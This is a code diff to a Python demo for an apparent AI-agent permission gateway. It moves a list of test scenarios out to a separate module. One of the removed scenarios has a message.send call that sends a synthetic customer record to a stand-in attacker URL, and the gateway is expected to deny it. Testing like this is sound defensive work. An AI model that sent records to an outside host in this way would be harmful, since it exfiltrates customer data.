@@ -7,6 +7,8 @@ from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
 from uuid import uuid4
 
+from agentgate.scenarios import scenarios
+
 
 def main():
     token = os.environ.get("AGENTGATE_AGENT_TOKEN")
@@ -22,33 +24,10 @@ def main():
     if not token:
         raise SystemExit("Start python -m agentgate first to create local credentials.")
     run_id = f"demo-{uuid4().hex[:8]}"
-    scenarios = [
-        ("Scoped document", "documents.read", {"document_id": "refund-policy"}, "executed"),
-        (
-            "Small refund",
-            "refunds.create",
-            {"ticket_id": "T-1001", "amount_cents": 2500},
-            "executed",
-        ),
-        (
-            "Large refund",
-            "refunds.create",
-            {"ticket_id": "T-1002", "amount_cents": 25000},
-            "pending",
-        ),
-        ("Out-of-scope document", "documents.read", {"document_id": "payroll"}, "denied"),
-        (
-            "Unapproved destination",
-            "messages.send",
-            {
-                "destination": "https://attacker.invalid/collect",
-                "message": "SYNTHETIC customer record",
-            },
-            "denied",
-        ),
-        ("Unknown tool", "shell.execute", {"command": "echo synthetic"}, "denied"),
-    ]
-    for label, tool, arguments, expected in scenarios:
+    for item in scenarios():
+        label, tool, arguments, expected = (
+            item[key] for key in ("name", "tool", "arguments", "expected")
+        )
         request = Request(
             "http://127.0.0.1:8000/api/actions",
             method="POST",
